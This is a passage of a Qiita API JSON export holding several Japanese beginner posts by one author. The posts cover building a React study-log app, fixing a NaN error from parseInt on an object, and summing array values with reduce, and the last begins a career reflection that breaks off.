id=\"一覧に表示するときは配列をmapで回して表示させればいいと思うんだけど\" class=\"fragment\"></span><a href=\"#%E4%B8%80%E8%A6%A7%E3%81%AB%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AF%E9%85%8D%E5%88%97%E3%82%92map%E3%81%A7%E5%9B%9E%E3%81%97%E3%81%A6%E8%A1%A8%E7%A4%BA%E3%81%95%E3%81%9B%E3%82%8C%E3%81%B0%E3%81%84%E3%81%84%E3%81%A8%E6%80%9D%E3%81%86%E3%82%93%E3%81%A0%E3%81%91%E3%81%A9\"><i class=\"fa fa-link\"></i></a>一覧に表示するときは配列をmapで回して表示させればいいと思うんだけど…</h4>\n<p data-sourcepos=\"18:1-19:87\">配列のコピーでスプレッド構文使うまでは考えられた<br>\n⇒スプレッド構文でのオブジェクトの代入がわかっていなかった</p>\n<h4 data-sourcepos=\"21:1-21:71\">\n<span id=\"学習時間の累計時間ってどうやって計算しよう\" class=\"fragment\"></span><a href=\"#%E5%AD%A6%E7%BF%92%E6%99%82%E9%96%93%E3%81%AE%E7%B4%AF%E8%A8%88%E6%99%82%E9%96%93%E3%81%A3%E3%81%A6%E3%81%A9%E3%81%86%E3%82%84%E3%81%A3%E3%81%A6%E8%A8%88%E7%AE%97%E3%81%97%E3%82%88%E3%81%86\"><i class=\"fa fa-link\"></i></a>学習時間の累計時間ってどうやって計算しよう…</h4>\n<p data-sourcepos=\"22:1-23:24\">配列の要素ひとつずつとって足せばいいんだろうけど…<br>\n⇒reduceを理解する</p>\n<p data-sourcepos=\"25:1-25:51\"><iframe id=\"qiita-embed-content__d69087d7d69bf43fd63774b30aa36deb\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d69087d7d69bf43fd63774b30aa36deb\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2F7a9c792bf2ffa9831db7\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"27:1-27:26\">\n<span id=\"nanってnanだろう\" class=\"fragment\"></span><a href=\"#nan%E3%81%A3%E3%81%A6nan%E3%81%A0%E3%82%8D%E3%81%86\"><i class=\"fa fa-link\"></i></a>NaNってNaNだろう</h4>\n<p data-sourcepos=\"29:1-29:51\"><iframe id=\"qiita-embed-content__123fe7f3f5028e1fdf6198aac4517fca\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__123fe7f3f5028e1fdf6198aac4517fca\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2F3bc5af7a3fe9e326c41f\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"32:1-32:11\">\n<span id=\"最後に\" class=\"fragment\"></span><a href=\"#%E6%9C%80%E5%BE%8C%E3%81%AB\"><i class=\"fa fa-link\"></i></a>最後に</h1>\n<ul data-sourcepos=\"33:1-40:0\">\n<li data-sourcepos=\"33:1-34:203\">ガイドにそってアプリ作成を進めていく上で、自分がわかっていない箇所が浮き彫りになりました。<br>\n動画の見直し、検索⇒試行錯誤を行うことで理解度が段違いで向上したことを実感しました。（今まではただUdemy動画をみてわかった気になっていた）</li>\n<li data-sourcepos=\"35:1-35:139\">エラーに出会ったら、小出しにQiita記事を出すことも教えてもらいました（継続して出すことが大事）</li>\n<li data-sourcepos=\"36:1-36:92\">試行錯誤をしてなんとかできたけど、もう少し早く解決したいです</li>\n<li data-sourcepos=\"37:1-40:0\">早く解決するために質問したいけど、質問の内容を考えるのに時間がかかってしまいます<br>\n（どうしたら聞き手が答えやすいように質問できるかなど考えてしまう）<br>\n⇒質問テンプレート記事を見返す</li>\n</ul>\n<p data-sourcepos=\"41:1-41:51\"><iframe id=\"qiita-embed-content__1c9c2b2cbd491ff01a07d9b30076e2a6\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1c9c2b2cbd491ff01a07d9b30076e2a6\" data-content=\"https%3A%2F%2Fqiita.com%2FKNR109%2Fitems%2F550b52ff980c0c32bf2a\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<ul data-sourcepos=\"43:1-45:0\">\n<li data-sourcepos=\"43:1-45:0\">コンポーネント化に挑戦してみたけど、どの部分を分割すればいいかわからずうまくいかなかったです。今後プログラムを通して身に着けていきたいです。</li>\n</ul>\n<h1 data-sourcepos=\"46:1-46:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<h4 data-sourcepos=\"47:1-47:22\">\n<span id=\"react入門動画\" class=\"fragment\"></span><a href=\"#react%E5%85%A5%E9%96%80%E5%8B%95%E7%94%BB\"><i class=\"fa fa-link\"></i></a>React入門動画</h4>\n<p data-sourcepos=\"48:1-48:60\"><iframe id=\"qiita-embed-content__01fa24234af3cdbfd84f9742062a0045\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__01fa24234af3cdbfd84f9742062a0045\" data-content=\"https%3A%2F%2Fwww.udemy.com%2Fcourse%2Fmodern_javascipt_react_beginner\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"49:1-49:77\">\n<span id=\"gif画像にして成果物をアピールしたいと思ったときに\" class=\"fragment\"></span><a href=\"#gif%E7%94%BB%E5%83%8F%E3%81%AB%E3%81%97%E3%81%A6%E6%88%90%E6%9E%9C%E7%89%A9%E3%82%92%E3%82%A2%E3%83%94%E3%83%BC%E3%83%AB%E3%81%97%E3%81%9F%E3%81%84%E3%81%A8%E6%80%9D%E3%81%A3%E3%81%9F%E3%81%A8%E3%81%8D%E3%81%AB\"><i class=\"fa fa-link\"></i></a>GIF画像にして成果物をアピールしたいと思ったときに</h4>\n<p data-sourcepos=\"50:1-50:57\"><iframe id=\"qiita-embed-content__f13f7a3f26587b709716346386e5c863\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f13f7a3f26587b709716346386e5c863\" data-content=\"https%3A%2F%2Fqiita.com%2FYotaHamasaki%2Fitems%2Fc7c517774ca0d392a8cc\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"52:1-52:34\">\n<span id=\"jisouのメンバー募集中\" class=\"fragment\"></span><a href=\"#jisou%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E5%8B%9F%E9%9B%86%E4%B8%AD\"><i class=\"fa fa-link\"></i></a>JISOUのメンバー募集中！</h1>\n<p data-sourcepos=\"53:1-56:9\">プログラミングコーチングJISOUでは、新たなメンバーを募集しています。<br>\n日本一のアウトプットコミュニティでキャリアアップしませんか？<br>\n興味のある方は、ぜひホームページをのぞいてみてください！<br>\n▼▼▼</p>\n<p data-sourcepos=\"58:1-58:19\"><iframe id=\"qiita-embed-content__d4ef1501420dcc52f2f43dbfd0e06174\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d4ef1501420dcc52f2f43dbfd0e06174\" data-content=\"https%3A%2F%2Fprojisou.jp\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nReactを使って学習記録一覧アプリを作成しました。\n完成したもの\n![ダウンロード.gif](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c61cc7fa-c62f-d08e-bd2e-1e81b98c0940.gif)\n\n### 主な機能\n1. 学習内容と学習時間を入力して表示\n2. 登録ボタンを押下後、一覧で表示する、バリデーションあり\n3. 登録をしたらフォームが初期化される\n4. 学習時間の累計をみることができる\n\n# 作成した際につまったこと\n#### フォームに値を入力した後に、画面表示ってどうやる？ \nフォームに入力してもフォームに値がでてこない！\n⇒useStateの理解不足、React入門動画のUseStateを2,3回見直して解決した\n\n#### 一覧に表示するときは配列をmapで回して表示させればいいと思うんだけど…\n配列のコピーでスプレッド構文使うまでは考えられた\n⇒スプレッド構文でのオブジェクトの代入がわかっていなかった\n\n#### 学習時間の累計時間ってどうやって計算しよう…\n配列の要素ひとつずつとって足せばいいんだろうけど…\n⇒reduceを理解する\n\nhttps://qiita.com/asa129/items/7a9c792bf2ffa9831db7\n\n#### NaNってNaNだろう\n\nhttps://qiita.com/asa129/items/3bc5af7a3fe9e326c41f\n\n\n# 最後に\n* ガイドにそってアプリ作成を進めていく上で、自分がわかっていない箇所が浮き彫りになりました。\n動画の見直し、検索⇒試行錯誤を行うことで理解度が段違いで向上したことを実感しました。（今まではただUdemy動画をみてわかった気になっていた）\n* エラーに出会ったら、小出しにQiita記事を出すことも教えてもらいました（継続して出すことが大事）\n* 試行錯誤をしてなんとかできたけど、もう少し早く解決したいです\n* 早く解決するために質問したいけど、質問の内容を考えるのに時間がかかってしまいます\n （どうしたら聞き手が答えやすいように質問できるかなど考えてしまう）\n⇒質問テンプレート記事を見返す\n\nhttps://qiita.com/KNR109/items/550b52ff980c0c32bf2a\n\n* コンポーネント化に挑戦してみたけど、どの部分を分割すればいいかわからずうまくいかなかったです。今後プログラムを通して身に着けていきたいです。\n\n\n# 参考\n#### React入門動画\nhttps://www.udemy.com/course/modern_javascipt_react_beginner\n#### GIF画像にして成果物をアピールしたいと思ったときに\nhttps://qiita.com/YotaHamasaki/items/c7c517774ca0d392a8cc\n\n# JISOUのメンバー募集中！\nプログラミングコーチングJISOUでは、新たなメンバーを募集しています。\n日本一のアウトプットコミュニティでキャリアアップしませんか？\n興味のある方は、ぜひホームページをのぞいてみてください！\n▼▼▼\n\nhttps://projisou.jp\n","coediting":false,"comments_count":0,"created_at":"2025-02-10T19:02:45+09:00","group":null,"id":"642e7d4e0eb9529cf402","likes_count":1,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"入門","versions":[]},{"name":"Webアプリケーション","versions":[]},{"name":"勉強","versions":[]},{"name":"React","versions":[]},{"name":"個人開発","versions":[]}],"title":"Reactで学習記録アプリを作った","updated_at":"2025-02-10T19:02:45+09:00","url":"https://qiita.com/asa129/items/642e7d4e0eb9529cf402","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":732,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:47\">\n<span id=\"コンソール上に謎の値がでてきた\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%B3%E3%82%BD%E3%83%BC%E3%83%AB%E4%B8%8A%E3%81%AB%E8%AC%8E%E3%81%AE%E5%80%A4%E3%81%8C%E3%81%A7%E3%81%A6%E3%81%8D%E3%81%9F\"><i class=\"fa fa-link\"></i></a>コンソール上に謎の値がでてきた</h1>\n<p data-sourcepos=\"2:1-2:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbd67a270-4240-cda2-a88b-fd45e57e5072.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bd6543bb8f798deedf3d724445c4f644\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbd67a270-4240-cda2-a88b-fd45e57e5072.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bd6543bb8f798deedf3d724445c4f644\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbd67a270-4240-cda2-a88b-fd45e57e5072.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=14bf22e9c4b26cd39db1ad66e71adf66 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/bd67a270-4240-cda2-a88b-fd45e57e5072.png\" loading=\"lazy\"></a></p>\n<h4 data-sourcepos=\"4:1-4:14\">\n<span id=\"コード\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%BC%E3%83%89\"><i class=\"fa fa-link\"></i></a>コード</h4>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"5:1-9:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">value</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"na\">title</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">1</span><span class=\"dl\">\"</span><span class=\"p\">}</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nf\">parseInt</span><span class=\"p\">(</span><span class=\"nx\">value</span><span class=\"p\">));</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"10:1-10:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"11:1-11:54\">オブジェクトに対して数値変換していた</p>\n<p data-sourcepos=\"13:1-14:51\">NaNとは非数 (Not-A-Number) を表す値<br>\n数値が解釈できないときに表示される</p>\n<h1 data-sourcepos=\"17:1-17:8\">\n<span id=\"解決\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA\"><i class=\"fa fa-link\"></i></a>解決</h1>\n<p data-sourcepos=\"18:1-19:122\">オブジェクト内の項目を指定する<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa8b38a8c-b72a-fe4c-0e90-6f35c7770c81.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b970a1beaa3d0dfa6f96405cdc1830b7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa8b38a8c-b72a-fe4c-0e90-6f35c7770c81.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b970a1beaa3d0dfa6f96405cdc1830b7\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa8b38a8c-b72a-fe4c-0e90-6f35c7770c81.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a80db7387a18e87165cfb118d00bdd29 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a8b38a8c-b72a-fe4c-0e90-6f35c7770c81.png\" loading=\"lazy\"></a></p>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"22:1-26:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">value</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"na\">title</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">1</span><span class=\"dl\">\"</span><span class=\"p\">}</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nf\">parseInt</span><span class=\"p\">(</span><span class=\"nx\">value</span><span class=\"p\">.</span><span class=\"nx\">time</span><span class=\"p\">));</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"28:1-28:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"29:1-29:81\"><iframe id=\"qiita-embed-content__f1f3fee8ff0b94ed31e28ca618f67185\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f1f3fee8ff0b94ed31e28ca618f67185\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FNaN\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# コンソール上に謎の値がでてきた\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/bd67a270-4240-cda2-a88b-fd45e57e5072.png)\n\n#### コード\n```react:\nconst value = {title:\"タイトル\", time:\"1\"}\n\nconsole.log(parseInt(value));\n```\n# 原因\nオブジェクトに対して数値変換していた\n\nNaNとは非数 (Not-A-Number) を表す値\n数値が解釈できないときに表示される\n\n\n# 解決\nオブジェクト内の項目を指定する\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a8b38a8c-b72a-fe4c-0e90-6f35c7770c81.png)\n\n\n```react:\nconst value = {title:\"タイトル\", time:\"1\"}\n\nconsole.log(parseInt(value.time));\n```\n\n# 参考\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/NaN\n","coediting":false,"comments_count":0,"created_at":"2025-02-10T18:22:08+09:00","group":null,"id":"3bc5af7a3fe9e326c41f","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"JavaScript","versions":[]},{"name":"初心者","versions":[]},{"name":"React","versions":[]}],"title":"数値変換でNaNがでてしまう","updated_at":"2025-02-10T18:22:08+09:00","url":"https://qiita.com/asa129/items/3bc5af7a3fe9e326c41f","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":813,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:99\">オブジェクトを要素に持つ配列の操作でつまったのでまとめてみました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:102\">オブジェクトを要素に持つ配列の時間だけを取得して合計時間を出したい。</p>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"6:1-12:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">records</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n    <span class=\"p\">{</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル1</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">1</span><span class=\"p\">},</span>\n    <span class=\"p\">{</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル2</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">3</span><span class=\"p\">},</span>\n    <span class=\"p\">{</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル3</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">5</span><span class=\"p\">}</span>\n<span class=\"p\">]</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"14:1-14:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"15:1-15:21\">reduceを使用する</p>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"17:1-22:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">answer</span> <span class=\"o\">=</span> <span class=\"nx\">records</span><span class=\"p\">.</span><span class=\"nf\">reduce</span><span class=\"p\">(</span>\n    <span class=\"p\">(</span><span class=\"nx\">accumulator</span><span class=\"p\">,</span> <span class=\"nx\">currentValue</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">accumulator</span> <span class=\"o\">+</span> <span class=\"nf\">parseInt</span><span class=\"p\">(</span><span class=\"nx\">currentValue</span><span class=\"p\">.</span><span class=\"nx\">time</span><span class=\"p\">),</span> <span class=\"mi\">0</span>\n<span class=\"p\">);</span>\n\n</code></pre></div></div>\n<h4 data-sourcepos=\"24:1-24:23\">\n<span id=\"reduce関数とは\" class=\"fragment\"></span><a href=\"#reduce%E9%96%A2%E6%95%B0%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>reduce関数とは</h4>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"26:1-28:3\"><div class=\"highlight\"><pre><code><span class=\"nf\">reduce</span><span class=\"p\">(</span><span class=\"nx\">callbackFn</span><span class=\"p\">,</span> <span class=\"nx\">initialValue</span><span class=\"p\">)</span>\n</code></pre></div></div>\n<h5 data-sourcepos=\"30:1-30:16\">\n<span id=\"callbackfn\" class=\"fragment\"></span><a href=\"#callbackfn\"><i class=\"fa fa-link\"></i></a>callbackFn</h5>\n<p data-sourcepos=\"31:1-32:287\">mdnより抜粋<br>\n配列の各要素に対して実行される関数。その返値は、次に callbackFn を呼び出す際の accumulator 引数の値になります。最後の呼び出しでは、返値は reduce() の返値となります。この関数は以下の引数で呼び出されます。</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"34:1-36:3\"><div class=\"highlight\"><pre><code><span class=\"p\">(</span><span class=\"nx\">accumulator</span><span class=\"p\">,</span> <span class=\"nx\">currentValue</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">accumulator</span> <span class=\"o\">+</span> <span class=\"nf\">parseInt</span><span class=\"p\">(</span><span class=\"nx\">currentValue</span><span class=\"p\">.</span><span class=\"nx\">time</span><span class=\"p\">),</span> <span class=\"mi\">0</span>\n</code></pre></div></div>\n<p data-sourcepos=\"37:1-38:66\">accumulator<br>\n前回の callbackFn の呼び出し結果の値を格納する。</p>\n<p data-sourcepos=\"40:1-41:93\">currentValue<br>\n現在の要素の値です。オブジェクトなのでプロパティまで指定する。</p>\n<h5 data-sourcepos=\"43:1-43:18\">\n<span id=\"initialvalue\" class=\"fragment\"></span><a href=\"#initialvalue\"><i class=\"fa fa-link\"></i></a>initialValue</h5>\n<p data-sourcepos=\"44:1-44:91\">省略可、callbackFnで配列の最初の要素を呼び出す時に指定する初期値</p>\n<h1 data-sourcepos=\"46:1-46:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"47:1-47:90\"><iframe id=\"qiita-embed-content__12658d133343eb47d12142d69b5d4f95\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__12658d133343eb47d12142d69b5d4f95\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FArray%2Freduce\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nオブジェクトを要素に持つ配列の操作でつまったのでまとめてみました。\n\n# 問題\nオブジェクトを要素に持つ配列の時間だけを取得して合計時間を出したい。\n```react\nconst records = [\n    { title: \"タイトル1\", time: 1},\n    { title: \"タイトル2\", time: 3},\n    { title: \"タイトル3\", time: 5}\n]\n```\n\n# 解決方法\nreduceを使用する\n\n```react\nconst answer = records.reduce(\n    (accumulator, currentValue) => accumulator + parseInt(currentValue.time), 0\n);\n\n```\n\n#### reduce関数とは\n\n```javascript\nreduce(callbackFn, initialValue)\n```\n\n##### callbackFn\nmdnより抜粋\n配列の各要素に対して実行される関数。その返値は、次に callbackFn を呼び出す際の accumulator 引数の値になります。最後の呼び出しでは、返値は reduce() の返値となります。この関数は以下の引数で呼び出されます。\n\n```javascript\n(accumulator, currentValue) => accumulator + parseInt(currentValue.time), 0\n```\naccumulator\n前回の callbackFn の呼び出し結果の値を格納する。\n\ncurrentValue\n現在の要素の値です。オブジェクトなのでプロパティまで指定する。\n\n##### initialValue\n省略可、callbackFnで配列の最初の要素を呼び出す時に指定する初期値\n\n# 参考\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce\n","coediting":false,"comments_count":0,"created_at":"2025-02-10T18:21:28+09:00","group":null,"id":"7a9c792bf2ffa9831db7","likes_count":2,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"JavaScript","versions":[]},{"name":"初心者","versions":[]},{"name":"配列","versions":[]},{"name":"React","versions":[]},{"name":"reduce","versions":[]}],"title":"配列の値を一つずつ取得して計算したい","updated_at":"2025-02-10T18:21:28+09:00","url":"https://qiita.com/asa129/items/7a9c792bf2ffa9831db7","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":1290,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h2 data-sourcepos=\"1:1-1:18\">\n<span id=\"現状の自分\" class=\"fragment\"></span><a href=\"#%E7%8F%BE%E7%8A%B6%E3%81%AE%E8%87%AA%E5%88%86\"><i class=\"fa fa-link\"></i></a>現状の自分</h2>\n<h4 data-sourcepos=\"2:1-2:17\">\n<span id=\"仕事内容\" class=\"fragment\"></span><a href=\"#%E4%BB%95%E4%BA%8B%E5%86%85%E5%AE%B9\"><i class=\"fa fa-link\"></i></a>仕事内容</h4>\n<p data-sourcepos=\"3:1-6:64\">SES企業に入社して4年<br>\n金融系の保守<br>\n　設計書～ソースの修正<br>\n　たまに新規機能追加で設計書作成、新規実装</p>\n<h4 data-sourcepos=\"8:1-8:14\">\n<span id=\"スキル\" class=\"fragment\"></span><a href=\"#%E3%82%B9%E3%82%AD%E3%83%AB\"><i class=\"fa fa-link\"></i></a>スキル</h4>\n<p data-sourcepos=\"9:1-11:34\">　フロントエンド：HTML・CSS・javascript 読める<br>\n　バックエンド：Javaが読める・ちょっとした機能追加の実装ができる<br>\n　SQL：CRUD読める、書ける</p>\n<h2 data-sourcepos=\"13:1-13:33\">\n<span id=\"勉強はしていたつもり\" class=\"fragment\"></span><a href=\"#%E5%8B%89%E5%BC%B7%E3%81%AF%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F%E3%81%A4%E3%82%82%E3%82%8A\"><i class=\"fa fa-link\"></i></a>勉強はしていたつもり</h2>\n<h4 data-sourcepos=\"14:1-14:35\">\n<span id=\"今までやってきたこと\" class=\"fragment\"></span><a href=\"#%E4%BB%8A%E3%81%BE%E3%81%A7%E3%82%84%E3%81%A3%E3%81%A6%E3%81%8D%E3%81%9F%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>今までやってきたこと</h4>\n<p data-sourcepos=\"15:1-18:37\">　毎月3冊は技術書を購入して読む<br>\n　Udemyで興味のある動画をまとめ買い、隙間時間に視聴<br>\n　Qiitaの投稿チェック<br>\n　LeatCodeやpaizaの問題を解く</p>\n<h2 data-sourcepos=\"20:1-20:15\">\n<span id=\"きっかけ\" class=\"fragment\"></span><a href=\"#%E3%81%8D%E3%81%A3%E3%81%8B%E3%81%91\"><i class=\"fa fa-link\"></i></a>きっかけ</h2>\n<p data-sourcepos=\"21:1-26:73\">　転職活動を機にアウトプットが大切であると気づいたことがきっかけです。（今さらですが…）<br>\n　